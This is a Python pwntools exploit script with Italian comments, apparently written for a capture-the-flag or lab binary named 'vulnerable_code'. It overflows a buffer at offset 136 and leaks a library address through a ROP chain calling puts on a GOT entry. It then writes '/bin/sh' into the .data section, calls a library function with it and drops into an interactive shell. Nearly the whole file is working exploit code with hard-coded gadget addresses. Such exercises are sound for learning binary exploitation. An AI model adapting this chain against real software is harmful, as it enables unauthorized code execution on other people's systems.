from pwn import *
from pprint import pprint
import warnings

warnings.filterwarnings("ignore")

offset = 136
binsh = "/bin/sh\x00"

# *--------------------- Gadgets --------------------*

where_to_write = int(hex(0x0000404048),0) # sezione trovata con readelf, .data  -> privilegi WA (write) (indirizzo con offset diverso per evitare di andare sul badchar \x2e)
pop_r12_r13 = int(hex(0x00004012dc),0) # pop r12; pop r13; pop r14; pop r15; ret;
pop_r12_r13 = int(hex(0x000040131c),0) # pop r12; pop r13; pop r14; pop r15; ret;
pop_r13 = int(hex(0x000040131e),0) # pop r13; pop r14; pop r15; ret;
mov_rax_r13 = int(hex(0x0000401151),0) # mov rax, r13; ret;
mov_mmr13_r12 = int(hex(0x0000401126),0) # mov qword ptr [r13], r12; ret;
pop_rdi = int(hex(0x0000401323),0) # pop rdi; ret;
pop_rsi = int(hex(0x0000401321),0) # pop rsi; pop r15; ret
pop_rsp = int(hex(0x000040131d),0) # pop rsp; pop r13; pop r14; pop r15; ret;
syscall =  int(hex(0x000040119d),0) # syscall gadget


def set_env(binary,library) : # funzione per settare i principali parametri del sistema
    
    elf = context.binary = ELF(binary)
    libc = ELF(library)
    p = elf.process()
    rop = ROP(elf)
    return elf, p, rop, libc
    
def send_payload(list) :  # se w_off Ã¨ true viene aggiunto al payload l'offset per mandare in overflow il buffer
    
    payload = dict();
    for (n,e) in list:
        payload[n] = e
    p.sendline(fit(payload))

# *--------------------- ENV SET ---------------------*

elf, p, rop, libc = set_env('./vulnerable_code','./lib.so') # setting del sistema

# *---------------------  START  ---------------------*

p.recvlines(8)
p.sendline("1")
p.recvuntil(":") # insert username

# *---------  ROP CHAIN -> leak start adress ---------*

rop = ROP([elf,libc])
rop.call(elf.symbols["puts"])
rop.call(elf.symbols["puts"],[elf.got["change_username"]])
rop.call(elf.symbols["change_username"])

payload = [(offset,rop)]

send_payload(payload)

p.recvlines(4)
cu_lib_idx = u64(p.recvuntil("\n").rstrip().ljust(8, b"\x00"))

# *---------  Set libc start memory adress ----------*

libc.address = cu_lib_idx - libc.symbols["change_username"]
log.info(f"Trovato l'indirzzo di partenza su cui risiedono le funzioni di lib.so in memoria : {hex(libc.address)}")

print(p.recvuntil(":")) # insert username

# *------------------- ROP CHAIN --------------------*

rop = ROP([elf,libc])
rop.raw(pop_r12_r13) # pop r12; pop r13; pop r14; pop r15; ret;
rop.raw(binsh) # r12 = "/bin/sh\x00"
rop.raw(where_to_write) # r13 = .data idx
rop.raw(p64(0x00)) # r14 = 0x0000000000000000
rop.raw(p64(0x00)) # r15 = 0x0000000000000000
rop.raw(mov_mmr13_r12) # mov [r13], r12; ret;

# *-------  ROP CHAIN using init_csu section --------*

rop.call(libc.symbols["secret_function"],[where_to_write])

payload = [(offset,rop)]

send_payload(payload)


p.recvlines(4)
p.interactive()